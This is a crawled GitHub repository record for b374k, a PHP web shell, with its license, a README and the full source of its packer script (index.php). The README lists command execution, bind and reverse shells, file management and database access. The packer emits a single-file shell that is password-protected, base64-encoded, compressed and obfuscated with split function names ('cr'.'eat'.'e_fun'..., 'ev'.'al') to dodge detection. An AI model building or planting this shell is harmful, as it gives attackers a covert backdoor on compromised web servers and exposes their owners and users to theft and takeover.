{
  "metadata": {
    "timestamp": 1736711566606,
    "page": 109,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjExMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "b374k/b374k",
      "stars": 2425,
      "defaultBranch": "master",
      "files": [
        {
          "name": "LICENSE.md",
          "type": "blob",
          "size": 1.0546875,
          "content": "The MIT License (MIT)\n\nCopyright (c) 2014 Aditya Kesuma\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of\nthis software and associated documentation files (the \"Software\"), to deal in\nthe Software without restriction, including without limitation the rights to\nuse, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of\nthe Software, and to permit persons to whom the Software is furnished to do so,\nsubject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS\nFOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR\nCOPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER\nIN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\nCONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 2.8134765625,
          "content": "# b374k shell 3.2\nThis PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser\n\nFeatures : \n * File manager (view, edit, rename, delete, upload, download, archiver, etc)\n * Search file, file content, folder (also using regex)\n * Command execution\n * Script execution (php, perl, python, ruby, java, node.js, c)\n * Give you shell via bind/reverse shell connect\n * Simple packet crafter\n * Connect to DBMS (mysql, mssql, oracle, sqlite, postgresql, and many more using ODBC or PDO)\n * SQL Explorer\n * Process list/Task manager\n * Send mail with attachment (you can attach local file on server)\n * String conversion\n * All of that only in 1 file, no installation needed\n * Support PHP > 4.3.3 and PHP 5\n\n## Requirements :\n * PHP version > 4.3.3 and PHP 5\n * As it using zepto.js v1.1.2, you need modern browser to use b374k shell. See browser support on zepto.js website http://zeptojs.com/\n * Responsibility of what you do with this shell\n \n## Installation :\nDownload b374k.php (default password : b374k), edit and change password and upload b374k.php to your server, password is in sha1(md5()) format. Or create your own b374k.php, explained below\n\n## Customize :\nAfter finished doing editing with files, upload index.php, base, module, theme and all files inside it to a server\n\nUsing Web Browser :\n\nOpen index.php in your browser, quick run will only run the shell. Use packer to pack all files into single PHP file. Set all the options available and the output file will be in the same directory as index.php\n\nUsing Console :\n```\n$ php -f index.php\nb374k shell packer 0.4\n\noptions :\n        -o filename                             save as filename\n        -p password                             protect with password\n        -t theme                                theme to use\n        -m modules                              modules to pack separated by comma\n        -s                                      strip comments and whitespaces\n        -b                                      encode with base64\n        -z [no|gzdeflate|gzencode|gzcompress]   compression (use only with -b)\n        -c [0-9]                                level of compression\n        -l                                      list available modules\n        -k                                      list available themes\n```\nexample :\n```\n$ php -f index.php -- -o myShell.php -p myPassword -s -b -z gzcompress -c 9\n```\nDon't forget to delete index.php, base, module, theme and all files inside it after you finished. Because it is not protected with password so it can be a security threat to your server\n\n## Documentation :\nComing soon\n\n## Old Version :\nIf your browser is not supported, or any other reason, you can view old version here\nhttps://code.google.com/p/b374k-shell/\n"
        },
        {
          "name": "base",
          "type": "tree",
          "content": null
        },
        {
          "name": "index.php",
          "type": "blob",
          "size": 17.8603515625,
          "content": "<?php\n/*\n\tb374k shell\n\tJayalah Indonesiaku\n\t(c)2014\n\thttps://github.com/b374k/b374k\n\n*/\n$GLOBALS['packer']['title'] = \"b374k shell packer\";\n$GLOBALS['packer']['version'] = \"0.4.2\";\n$GLOBALS['packer']['base_dir'] = \"./base/\";\n$GLOBALS['packer']['module_dir'] = \"./module/\";\n$GLOBALS['packer']['theme_dir'] = \"./theme/\";\n$GLOBALS['packer']['module'] = packer_get_module();\n$GLOBALS['packer']['theme'] = packer_get_theme();\n\nrequire $GLOBALS['packer']['base_dir'].'jsPacker.php';\n\n/* PHP FILES START */\n$base_code = \"\";\n$base_code .= packer_read_file($GLOBALS['packer']['base_dir'].\"resources.php\");\n$base_code .= packer_read_file($GLOBALS['packer']['base_dir'].\"main.php\");\n$module_code = packer_read_file($GLOBALS['packer']['base_dir'].\"base.php\");\n/* PHP FILES END */\n\n/* JAVASCRIPT AND CSS FILES START */\n$zepto_code = packer_read_file($GLOBALS['packer']['base_dir'].\"zepto.js\");\n$js_main_code = \"\\n\\n\".packer_read_file($GLOBALS['packer']['base_dir'].\"main.js\");\n\n$js_code = \"\\n\\n\".packer_read_file($GLOBALS['packer']['base_dir'].\"sortable.js\").$js_main_code;\n$js_code .= \"\\n\\n\".packer_read_file($GLOBALS['packer']['base_dir'].\"base.js\");\n\n\nif(isset($_COOKIE['packer_theme']))\t$theme = $_COOKIE['packer_theme'];\nelse $theme =\"default\";\n$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.\".css\");\n\n/* JAVASCRIPT AND CSS FILES END */\n\n// layout\n$layout = packer_read_file($GLOBALS['packer']['base_dir'].\"layout.php\");\n$p = array_map(\"rawurldecode\", packer_get_post());\n\nif(isset($_SERVER['REMOTE_ADDR'])){\n\tif(isset($p['read_file'])){\n\t\t$file = $p['read_file'];\n\t\tif(is_file($file)){\n\t\t\tpacker_output(packer_html_safe(packer_read_file($file)));\n\t\t}\n\t\tpacker_output('error');\n\t}\n\telseif(isset($_GET['run'])){\n\t\tif(empty($_GET['run'])) $modules = array();\n\t\telse $modules = explode(\",\" ,$_GET['run']);\n\t\t$module_arr = array_merge(array(\"explorer\", \"terminal\", \"eval\"), $modules);\n\n\t\t$module_arr = array_map(\"packer_wrap_with_quote\", $module_arr);\n\t\t$module_init = \"\\n\\$GLOBALS['module_to_load'] = array(\".implode(\", \", $module_arr).\");\";\n\n\t\tforeach($modules as $module){\n\t\t\t$module = trim($module);\n\t\t\t$filename = $GLOBALS['packer']['module_dir'].$module;\n\t\t\tif(is_file($filename.\".php\")) $module_code .= packer_read_file($filename.\".php\");\n\t\t\tif(is_file($filename.\".js\")) $js_code .= \"\\n\".packer_read_file($filename.\".js\").\"\\n\";\n\n\t\t}\n\n\t\t$layout = str_replace(\"<__CSS__>\", $css_code, $layout);\n\t\t$layout = str_replace(\"<__ZEPTO__>\", $zepto_code, $layout);\n\t\t$layout = str_replace(\"<__JS__>\", $js_code, $layout);\n\n\t\t$content = trim($module_init).\"?>\".$base_code.$module_code.$layout;\n\t\teval($content);\n\t\tdie();\n\t}\n\telseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])){\n\t\t$outputfile = trim($p['outputfile']);\n\t\tif(empty($outputfile)) $outputfile = 'b374k.php';\n\t\t$password = trim($p['password']);\n\t\t$modules = trim($p['module']);\n\t\tif(empty($modules)) $modules = array();\n\t\telse $modules = explode(\",\" ,$modules);\n\n\t\t$strip = trim($p['strip']);\n\t\t$base64 = trim($p['base64']);\n\t\t$compress = trim($p['compress']);\n\t\t$compress_level = (int) $p['compress_level'];\n\n\t\t$module_arr = array_merge(array(\"explorer\", \"terminal\", \"eval\"), $modules);\n\n\t\t$module_arr = array_map(\"packer_wrap_with_quote\", $module_arr);\n\t\t$module_init = \"\\n\\$GLOBALS['module_to_load'] = array(\".implode(\", \", $module_arr).\");\";\n\n\t\tforeach($modules as $module){\n\t\t\t$module = trim($module);\n\t\t\t$filename = $GLOBALS['packer']['module_dir'].$module;\n\t\t\tif(is_file($filename.\".php\")) $module_code .= packer_read_file($filename.\".php\");\n\t\t\tif(is_file($filename.\".js\")) $js_code .= \"\\n\".packer_read_file($filename.\".js\").\"\\n\";\n\n\t\t}\n\n\t\t$layout = str_replace(\"<__CSS__>\", $css_code, $layout);\n\t\t$layout = str_replace(\"<__ZEPTO__>\", $zepto_code, $layout);\n\t\t\n\t\tif($strip=='yes') $js_code = packer_pack_js($js_code);\n\t\t$layout = str_replace(\"<__JS__>\", $js_code, $layout);\n\n\n\t\t$htmlcode = trim($layout);\n\t\t$phpcode = \"<?php \".trim($module_init).\"?>\".trim($base_code).trim($module_code);\n\n\t\tpacker_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));\n\t}\n\telse{\n\t\n\t$available_themes = \"<tr><td>Theme</td><td><select class='theme' style='width:150px;'>\";\n\tforeach($GLOBALS['packer']['theme'] as $k){\n\t\tif($k==$theme) $available_themes .= \"<option selected='selected'>\".$k.\"</option>\";\n\t\telse $available_themes .= \"<option>\".$k.\"</option>\";\n\t}\n\t$available_themes .= \"</select></td></tr>\";\n\n\t?><!doctype html>\n\t<html>\n\t<head>\n\t<title><?php echo $GLOBALS['packer']['title'].\" \".$GLOBALS['packer']['version'];?></title>\n\t<meta charset='utf-8'>\n\t<meta name='robots' content='noindex, nofollow, noarchive'>\n\t<style type=\"text/css\">\n\t<?php echo $css_code;?>\n\t#devTitle{\n\t\tfont-size:18px;\n\t\ttext-align:center;\n\t\tfont-weight:bold;\n\t}\n\t</style>\n\t</head>\n\t<body>\n\n\t<div id='wrapper' style='padding:12px'>\n\t\t<div id='devTitle' class='border'><?php echo $GLOBALS['packer']['title'].\" \".$GLOBALS['packer']['version'];?></div>\n\t\t<br>\n\t\t<table class='boxtbl'>\n\t\t\t<tr><th colspan='2'><p class='boxtitle'>Quick Run</p></th></tr>\n\t\t\t<tr><td style='width:220px;'>Module (separated by comma)</td><td><input type='text' id='module' value='<?php echo implode(\",\", $GLOBALS['packer']['module']);?>'></td></tr>\n\t\t\t<?php echo $available_themes; ?>\n\t\t\t<tr><td colspan='2'>\n\t\t\t\t<form method='get' id='runForm' target='_blank'><input type='hidden' id='module_to_run' name='run' value=''>\n\t\t\t\t<span class='button' id='runGo'>Run</span>\n\t\t\t\t</form>\n\t\t\t</td></tr>\n\t\t</table>\n\t\t<br>\n\t\t<table class='boxtbl'>\n\t\t\t<tr><th colspan='2'><p class='boxtitle'>Pack</p></th></tr>\n\t\t\t<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='b374k.php'></td></tr>\n\t\t\t<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>\n\t\t\t<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(\",\", $GLOBALS['packer']['module']);?>'></td></tr>\n\t\t\t<?php echo $available_themes; ?>\n\t\t\t<tr><td>Strip Comments and Whitespaces</td><td>\n\t\t\t\t<select id='strip' style='width:150px;'>\n\t\t\t\t\t<option selected=\"selected\">yes</option>\n\t\t\t\t\t<option>no</option>\n\t\t\t\t</select>\n\t\t\t</td></tr>\n\n\t\t\t<tr><td>Base64 Encode</td><td>\n\t\t\t\t<select id='base64' style='width:150px;'>\n\t\t\t\t\t<option selected=\"selected\">yes</option>\n\t\t\t\t\t<option>no</option>\n\t\t\t\t</select>\n\t\t\t</td></tr>\n\n\t\t\t<tr id='compress_row'><td>Compress</td><td>\n\t\t\t\t<select id='compress' style='width:150px;'>\n\t\t\t\t\t<option>no</option>\n\t\t\t\t\t<option selected=\"selected\">gzdeflate</option>\n\t\t\t\t\t<option>gzencode</option>\n\t\t\t\t\t<option>gzcompress</option>\n\t\t\t\t</select>\n\t\t\t\t<select id='compress_level' style='width:150px;'>\n\t\t\t\t\t<option>1</option>\n\t\t\t\t\t<option>2</option>\n\t\t\t\t\t<option>3</option>\n\t\t\t\t\t<option>4</option>\n\t\t\t\t\t<option>5</option>\n\t\t\t\t\t<option>6</option>\n\t\t\t\t\t<option>7</option>\n\t\t\t\t\t<option>8</option>\n\t\t\t\t\t<option selected=\"selected\">9</option>\n\t\t\t\t</select>\n\t\t\t</td></tr>\n\n\t\t\t<tr><td colspan='2'>\n\t\t\t\t<span class='button' id='packGo'>Pack</span>\n\t\t\t</td></tr>\n\t\t\t<tr><td colspan='2' id='result'></td></tr>\n\t\t\t<tr><td colspan='2'><textarea id='resultContent'></textarea></td></tr>\n\t\t</table>\n\t</div>\n\n\t<script type='text/javascript'>\n\tvar init_shell = false;\n\t<?php echo $zepto_code;?>\n\t<?php echo $js_main_code;?>\n\n\tvar targeturl = '<?php echo packer_get_self(); ?>';\n\tvar debug = false;\n\n\tZepto(function($){\n\t\trefresh_row();\n\n\t\t$('#runGo').on('click', function(e){\n\t\t\tmodule = $('#module').val();\n\t\t\t$('#module_to_run').val(module);\n\t\t\t$('#runForm').submit();\n\t\t});\n\n\t\t$('#base64').on('change', function(e){\n\t\t\trefresh_row();\n\t\t});\n\n\t\t$('#packGo').on('click', function(e){\n\t\t\toutputfile = $('#outputfile').val();\n\t\t\tpassword = $('#password').val();\n\t\t\tmodule = $('#module_to_pack').val();\n\t\t\tstrip = $('#strip').val();\n\t\t\tbase64 = $('#base64').val();\n\t\t\tcompress = $('#compress').val();\n\t\t\tcompress_level = $('#compress_level').val();\n\n\t\t\tsend_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level}, function(res){\n\t\t\t\tsplits = res.split('{[|b374k|]}');\n\t\t\t\t$('#resultContent').html(splits[1]);\n\t\t\t\t$('#result').html(splits[0]);\n\t\t\t});\n\n\t\t});\n\t\t\n\t\t$('.theme').on('change', function(e){\n\t\t\t$('.theme').val($(this).val());\n\t\t\tset_cookie('packer_theme', $('.theme').val());\n\t\t\tlocation.href = targeturl;\n\t\t});\n\t});\n\n\tfunction refresh_row(){\n\t\tbase64 = $('#base64').val();\n\t\tif(base64=='yes'){\n\t\t\t$('#compress_row').show();\n\t\t}\n\t\telse{\n\t\t\t$('#compress_row').hide();\n\t\t\t$('#compress').val('no');\n\t\t}\n\t}\n\n\t</script>\n\t</body>\n\t</html><?php\n\t}\n}\nelse{\n\t$output = $GLOBALS['packer']['title'].\" \".$GLOBALS['packer']['version'].\"\\n\\n\";\n\n\tif(count($argv)<=1){\n\t\t$output .= \"options :\\n\";\n\t\t$output .= \"\\t-o filename\\t\\t\\t\\tsave as filename\\n\";\n\t\t$output .= \"\\t-p password\\t\\t\\t\\tprotect with password\\n\";\n\t\t$output .= \"\\t-t theme\\t\\t\\t\\ttheme to use\\n\";\n\t\t$output .= \"\\t-m modules\\t\\t\\t\\tmodules to pack separated by comma\\n\";\n\t\t$output .= \"\\t-s\\t\\t\\t\\t\\tstrip comments and whitespaces\\n\";\n\t\t$output .= \"\\t-b\\t\\t\\t\\t\\tencode with base64\\n\";\n\t\t$output .= \"\\t-z [no|gzdeflate|gzencode|gzcompress]\\tcompression (use only with -b)\\n\";\n\t\t$output .= \"\\t-c [0-9]\\t\\t\\t\\tlevel of compression\\n\";\n\t\t$output .= \"\\t-l\\t\\t\\t\\t\\tlist available modules\\n\";\n\t\t$output .= \"\\t-k\\t\\t\\t\\t\\tlist available themes\\n\";\n\n\t}\n\telse{\n\t\t$opt = getopt(\"o:p:t:m:sbz:c:lk\");\n\n\t\tif(isset($opt['l'])){\n\t\t\t$output .= \"available modules : \".implode(\",\", $GLOBALS['packer']['module']).\"\\n\\n\";\n\t\t\techo $output;\n\t\t\tdie();\n\t\t}\n\t\t\n\t\tif(isset($opt['k'])){\n\t\t\t$output .= \"available themes : \".implode(\",\", $GLOBALS['packer']['theme']).\"\\n\\n\";\n\t\t\techo $output;\n\t\t\tdie();\n\t\t}\n\n\t\tif(isset($opt['o'])&&(trim($opt['o'])!='')){\n\t\t\t$outputfile = trim($opt['o']);\n\t\t}\n\t\telse{\n\t\t\t$output .= \"error : no filename given (use -o filename)\\n\\n\";\n\t\t\techo $output;\n\t\t\tdie();\n\t\t}\n\n\t\t$password = isset($opt['p'])? trim($opt['p']):\"\";\n\t\t$theme = isset($opt['t'])? trim($opt['t']):\"default\";\n\t\tif(!in_array($theme, $GLOBALS['packer']['theme'])){\n\t\t\t$output .= \"error : unknown theme file\\n\\n\";\n\t\t\techo $output;\n\t\t\tdie();\n\t\t}\n\t\t$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.\".css\");\n\t\t\n\t\t$modules = isset($opt['m'])? trim($opt['m']):implode(\",\", $GLOBALS['packer']['module']);\n\t\tif(empty($modules)) $modules = array();\n\t\telse $modules = explode(\",\" ,$modules);\n\n\t\t$strip = isset($opt['s'])? \"yes\":\"no\";\n\t\t$base64 = isset($opt['b'])? \"yes\":\"no\";\n\n\t\t$compress = isset($opt['z'])? trim($opt['z']):\"no\";\n\t\tif(($compress!='gzdeflate')&&($compress!='gzencode')&&($compress!='gzcompress')&&($compress!='no')){\n\t\t\t$output .= \"error : unknown options -z \".$compress.\"\\n\\n\";\n\t\t\techo $output;\n\t\t\tdie();\n\t\t}\n\t\telse{\n\t\t\tif(($base64=='no')&&($compress!='no')){\n\t\t\t\t$output .= \"error : use -z options only with -b\\n\\n\";\n\t\t\t\techo $output;\n\t\t\t\tdie();\n\t\t\t}\n\t\t}\n\n\t\t$compress_level = isset($opt['c'])? trim($opt['c']):\"\";\n\t\tif(empty($compress_level)) $compress_level = '9';\n\t\tif(!preg_match(\"/^[0-9]{1}$/\", $compress_level)){\n\t\t\t$output .= \"error : unknown options -c \".$compress_level.\" (use only 0-9)\\n\\n\";\n\t\t\techo $output;\n\t\t\tdie();\n\t\t}\n\t\t$compress_level = (int) $compress_level;\n\n\t\t$output .= \"Filename\\t\\t: \".$outputfile.\"\\n\";\n\t\t$output .= \"Password\\t\\t: \".$password.\"\\n\";\n\t\t$output .= \"Theme\\t\\t\\t: \".$theme.\"\\n\";\n\t\t$output .= \"Modules\\t\\t\\t: \".implode(\",\",$modules).\"\\n\";\n\t\t$output .= \"Strip\\t\\t\\t: \".$strip.\"\\n\";\n\t\t$output .= \"Base64\\t\\t\\t: \".$base64.\"\\n\";\n\t\tif($base64=='yes') $output .= \"Compression\\t\\t: \".$compress.\"\\n\";\n\t\tif($base64=='yes') $output .= \"Compression level\\t: \".$compress_level.\"\\n\";\n\n\t\t$module_arr = array_merge(array(\"explorer\", \"terminal\", \"eval\"), $modules);\n\t\t$module_arr = array_map(\"packer_wrap_with_quote\", $module_arr);\n\t\t$module_init = \"\\n\\$GLOBALS['module_to_load'] = array(\".implode(\", \", $module_arr).\");\";\n\n\t\tforeach($modules as $module){\n\t\t\t$module = trim($module);\n\t\t\t$filename = $GLOBALS['packer']['module_dir'].$module;\n\t\t\tif(is_file($filename.\".php\")) $module_code .= packer_read_file($filename.\".php\");\n\t\t\tif(is_file($filename.\".js\")) $js_code .= \"\\n\".packer_read_file($filename.\".js\").\"\\n\";\n\t\t}\n\n\t\t$layout = str_replace(\"<__CSS__>\", $css_code, $layout);\n\t\t$layout = str_replace(\"<__ZEPTO__>\", $zepto_code, $layout);\n\t\t\n\t\tif($strip=='yes') $js_code = packer_pack_js($js_code);\n\t\t$layout = str_replace(\"<__JS__>\", $js_code, $layout);\n\n\t\t$htmlcode = trim($layout);\n\t\t$phpcode = \"<?php \".trim($module_init).\"?>\".trim($base_code).trim($module_code);\n\n\t\t$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);\n\t\t$status = explode(\"{[|b374k|]}\", $res);\n\t\t$output .= \"Result\\t\\t\\t: \".strip_tags($status[0]).\"\\n\\n\";\n\t}\n\techo $output;\n}\n\nfunction packer_read_file($file){\n\t$content = false;\n\tif($fh = @fopen($file, \"rb\")){\n\t\t$content = \"\";\n\t\twhile(!feof($fh)){\n\t\t  $content .= fread($fh, 8192);\n\t\t}\n\t}\n\treturn $content;\n}\n\nfunction packer_write_file($file, $content){\n\tif($fh = @fopen($file, \"wb\")){\n\t\tif(fwrite($fh, $content)!==false){\n\t\t\tif(!class_exists(\"ZipArchive\")) return true;\n\t\t\t\n\t\t\tif(file_exists($file.\".zip\")) unlink ($file.\".zip\");\n\t\t\t$zip = new ZipArchive();\n\t\t\t$filename = \"./\".$file.\".zip\";\n\n\t\t\tif($zip->open($filename, ZipArchive::CREATE)!==TRUE) return false;\n\t\t\t$zip->addFile($file);\n\t\t\t$zip->close();\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n\nfunction packer_get_post(){\n\treturn packer_fix_magic_quote($_POST);\n}\n\nfunction packer_fix_magic_quote($arr){\n\t$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));\n\tif(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){\n\t\tif(is_array($arr)){\n\t\t\tforeach($arr as $k=>$v){\n\t\t\t\tif(is_array($v)) $arr[$k] = clean($v);\n\t\t\t\telse $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace(\"\\'\\'\", \"\\'\", $v));\n\t\t\t}\n\t\t}\n\t}\n\treturn $arr;\n}\n\nfunction packer_html_safe($str){\n\treturn htmlspecialchars($str, 2 | 1);\n}\n\nfunction packer_wrap_with_quote($str){\n\treturn \"\\\"\".$str.\"\\\"\";\n}\n\nfunction packer_output($str){\n\theader(\"Content-Type: text/plain\");\n\theader(\"Cache-Control: no-cache\");\n\theader(\"Pragma: no-cache\");\n\techo $str;\n\tdie();\n}\n\nfunction packer_get_self(){\n\t$query = (isset($_SERVER[\"QUERY_STRING\"])&&(!empty($_SERVER[\"QUERY_STRING\"])))?\"?\".$_SERVER[\"QUERY_STRING\"]:\"\";\n\treturn packer_html_safe($_SERVER[\"REQUEST_URI\"].$query);\n}\n\nfunction packer_strips($str){\n\t$newStr = '';\n\n\t$commentTokens = array(T_COMMENT);\n\n\tif(defined('T_DOC_COMMENT')) $commentTokens[] = T_DOC_COMMENT;\n\tif(defined('T_ML_COMMENT'))\t$commentTokens[] = T_ML_COMMENT;\n\n\t$tokens = token_get_all($str);\n\n\tforeach($tokens as $token){\n\t\tif (is_array($token)) {\n\t\t\tif (in_array($token[0], $commentTokens)) continue;\n\t\t\t$token = $token[1];\n\t\t}\n\t$newStr .= $token;\n\t}\n\t$newStr = preg_replace(\"/(\\s{2,})/\", \" \", $newStr);\n\treturn $newStr;\n}\n\nfunction packer_get_theme(){\n\t$available_themes = array();\n\tforeach(glob($GLOBALS['packer']['theme_dir'].\"*.css\") as $filename){\n\t\t$filename = basename($filename, \".css\");\n\t\t$available_themes[] = $filename;\n\t}\n\treturn $available_themes;\n}\n\nfunction packer_get_module(){\n\t$available_modules = array();\n\tforeach(glob($GLOBALS['packer']['module_dir'].\"*.php\") as $filename){\n\t\t$filename = basename($filename, \".php\");\n\t\tif(packer_check_module($filename)) $available_modules[] = $filename;\n\t}\n\treturn $available_modules;\n}\n\nfunction packer_check_module($module){\n\t$filename = $GLOBALS['packer']['module_dir'].$module;\n\tif(is_file($filename.\".php\")){\n\t\t$content = packer_read_file($filename.\".php\");\n\t\t@eval(\"?>\".$content);\n\t\tif($GLOBALS['module'][$module]['id']==$module) return true;\n\t}\n\treturn false;\n}\n\nfunction packer_pack_js($str){\n\t$packer = new JavaScriptPacker($str, 0, true, false);\n\treturn $packer->pack();\n}\n\nfunction packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){\n\t$content = \"\";\n\tif(is_file($output)){\n\t\tif(!is_writable($output)) return \"error : file \".$output.\" exists and is not writable{[|b374k|]}\";\n\t}\n\n\tif(!empty($password)) $password = \"\\$GLOBALS['pass'] = \\\"\".sha1(md5($password)).\"\\\"; // sha1(md5(pass))\\n\";\n\n\t$compress_level = (int) $compress_level;\n\tif($compress_level<0) $compress_level = 0;\n\telseif($compress_level>9) $compress_level = 9;\n\n\t$version = \"\";\n\tif(preg_match(\"/\\\\\\$GLOBALS\\['ver'\\]\\ *=\\ *[\\\"']+([^\\\"']+)[\\\"']+/\", $phpcode, $r)){\n\t\t$version = $r[1];\n\t}\n\t\n\t$header = \"<?php\n/*\n\tb374k shell \".$version.\"\n\tJayalah Indonesiaku\n\t(c)\".@date(\"Y\",time()).\"\n\thttps://github.com/b374k/b374k\n\n*/\\n\";\n\n\n\tif($strip=='yes'){\n\t\t$phpcode = packer_strips($phpcode);\n\t\t$htmlcode = preg_replace(\"/(\\ {2,}|\\n{2,}|\\t+)/\", \"\", $htmlcode);\n\t\t$htmlcode = preg_replace(\"/\\r/\", \"\", $htmlcode);\n\t\t$htmlcode = preg_replace(\"/}\\n+/\", \"}\", $htmlcode);\n\t\t$htmlcode = preg_replace(\"/\\n+}/\", \"}\", $htmlcode);\n\t\t$htmlcode = preg_replace(\"/\\n+{/\", \"{\", $htmlcode);\n\t\t$htmlcode = preg_replace(\"/\\n+/\", \"\\n\", $htmlcode);\n\t}\n\n\n\t$content = $phpcode.$htmlcode;\n\n\tif($compress=='gzdeflate'){\n\t\t$content = gzdeflate($content, $compress_level);\n\t\t$encoder_func = \"gz'.'in'.'fla'.'te\";\n\t}\n\telseif($compress=='gzencode'){\n\t\t$content = gzencode($content, $compress_level);\n\t\t$encoder_func = \"gz'.'de'.'co'.'de\";\n\t}\n\telseif($compress=='gzcompress'){\n\t\t$content = gzcompress($content, $compress_level);\n\t\t$encoder_func = \"gz'.'un'.'com'.'pre'.'ss\";\n\t}\n\telse{\n\t\t$encoder_func = \"\";\n\t}\n\n\tif($base64=='yes'){\n\t\t$content = base64_encode($content);\n\t\tif($compress!='no'){\n\t\t\t$encoder = $encoder_func.\"(ba'.'se'.'64'.'_de'.'co'.'de(\\$x))\";\n\t\t}\n\t\telse{\n\t\t\t$encoder = \"ba'.'se'.'64'.'_de'.'co'.'de(\\\"\\$x\\\")\";\n\t\t}\n\n\t\t$code = $header.$password.\"\\$func=\\\"cr\\\".\\\"eat\\\".\\\"e_fun\\\".\\\"cti\\\".\\\"on\\\";\\$b374k=\\$func('\\$x','ev'.'al'.'(\\\"?>\\\".\".$encoder.\");');\\$b374k(\\\"\".$content.\"\\\");?>\";\n\t}\n\telse{\n\t\tif($compress!='no'){\n\t\t\t$encoder = $encoder_func.\"(\\$x)\";\n\t\t}\n\t\telse{\n\t\t\t$code = $header.$password.\"?>\".$content;\n\t\t\t$code = preg_replace(\"/\\?>\\s*<\\?php\\s*/\", \"\", $code);\n\t\t}\n\t}\n\n\tif(is_file($output)) unlink($output);\n\tif(packer_write_file($output, $code)){\n\t\tchmod($output, 0777);\n\t\treturn \"Succeeded : <a href='\".$output.\"' target='_blank'>[ \".$output.\" ] Filesize : \".filesize($output).\"</a>{[|b374k|]}\".packer_html_safe(trim($code));\n\t}\n\treturn \"error{[|b374k|]}\";\n}\n\n?>\n"
        },
        {
          "name": "module",
          "type": "tree",
          "content": null
        },
        {
          "name": "theme",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}